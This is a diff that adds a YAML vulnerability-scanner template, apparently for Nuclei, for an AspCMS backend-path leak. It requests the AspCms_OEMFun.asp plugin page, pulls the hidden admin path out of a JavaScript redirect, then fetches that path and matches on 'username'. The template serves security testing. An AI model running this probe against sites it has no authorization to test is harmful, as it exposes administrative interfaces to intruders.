@@ -1,0 +1,48 @@
+id: poc-local-xray-aspcms-backend-leak
+
+info:
+  name: poc-local-xray-aspcms-backend-leak
+  author: capiton
+  severity: medium
+  reference:
+    - https://www.onebug.org/wooyundata/65458.html
+  tags: aspcms
+
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/plug/oem/AspCms_OEMFun.asp"
+      - "{{RootURL}}{{path}}"
+    
+    req-condition: true
+    matchers-condition: and
+
+    extractors:
+      - type: regex 
+        part: body  # part of the response (header,body,all)
+        group: 1   
+        internal: true
+        name: path
+        regex:
+          - "top.location.href='(.*?)';</script>" 
+        
+
+    matchers:
+      # - type: status
+      #   status:
+      #     - 200
+
+      - type: dsl
+        dsl:
+          - contains(body_1,"<script>alert")
+          - contains(body_1,"top.location.href=")
+      - type: dsl
+        dsl:
+          - contains(body_2,"username")
+      # - type: word
+      #   condition: and
+      #   part: body
+      #   words:
+      #     - "<script>alert"
+      #     - "top.location.href="
